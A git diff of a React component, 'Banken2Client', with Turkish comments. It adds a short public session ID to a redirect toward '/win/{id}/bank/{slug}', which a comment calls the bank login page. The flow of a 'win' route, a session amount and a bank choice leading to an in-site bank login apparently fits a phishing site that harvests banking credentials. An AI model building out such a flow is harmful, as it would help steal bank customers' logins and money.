@@ -30,6 +30,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const containerRef = useRef<HTMLDivElement>(null);
   const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
+  const [publicId, setPublicId] = useState<string | null>(null);
   const [html, setHtml] = useState("");
   const [fd, setFd] = useState<Record<string, any>>({});
   const [amount, setAmount] = useState<number>(0);
@@ -88,10 +89,11 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
     void (async () => {
       const { data } = await supabase
         .from("sessions")
-        .select("amount,form_data")
+        .select("amount,form_data,public_id")
         .eq("id", effectiveSessionId)
         .maybeSingle();
       if (cancelled) return;
+      if (data?.public_id != null) setPublicId(String(data.public_id));
       const formData = (data?.form_data ?? {}) as Record<string, any>;
       setFd(formData);
       const amt =
@@ -164,14 +166,25 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
         setSaving(false);
         return;
       }
-      const routeId = routeSessionId || effectiveSessionId;
+      // URL'de uzun UUID yerine kisa public_id kullan (invalid-bank akisinda
+      // routeSessionId prop'u UUID gelebiliyor).
+      const shortRoute =
+        routeSessionId && !routeSessionId.includes("-") ? routeSessionId : null;
+      const routeId = publicId || shortRoute || routeSessionId || effectiveSessionId || "";
+      // Son boyanmis frame'de eski liste gorunmesin: icerigi bosalt, sadece
+      // portal arkaplani kalir -> banka login sayfasina temiz gecis.
+      const rootEl = containerRef.current;
+      if (rootEl) {
+        rootEl.innerHTML = "";
+        rootEl.style.opacity = "1";
+      }
       window.location.href = `/win/${encodeURIComponent(routeId)}/bank/${slug}`;
     };
 
     root.addEventListener("click", onClick);
     return () => root.removeEventListener("click", onClick);
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [html, ready, fd, amount, invalid, effectiveSessionId, routeSessionId, supabase]);
+  }, [html, ready, fd, amount, invalid, effectiveSessionId, routeSessionId, publicId, supabase]);
 
   return (
     <div
